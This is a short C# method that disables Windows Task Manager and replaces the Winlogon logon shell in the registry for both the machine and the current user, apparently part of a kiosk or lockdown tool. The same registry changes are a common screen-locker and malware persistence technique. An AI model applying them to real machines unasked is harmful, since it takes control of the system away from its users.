    public void embedSoftware()
    {
        try
        {
            // Disable Task Manager
            regKey = Registry.CurrentUser.OpenSubKey(subKey, true).CreateSubKey("System");
            regKey.SetValue("DisableTaskMgr", 1);
            regKey.Close();
            // Change the Local Machine shell executable
            regKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
            regKey.SetValue("Shell", shell, RegistryValueKind.String);
            regKey.Close();
            // Create the Shell executable Registry entry for Current User
            regKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
            regKey.SetValue("Shell", shell);
            regKey.Close();
            MessageBox.Show("Embedding Complete");
                
        }
        catch (Exception e)
        {
            MessageBox.Show(e.Message);
        }
    }
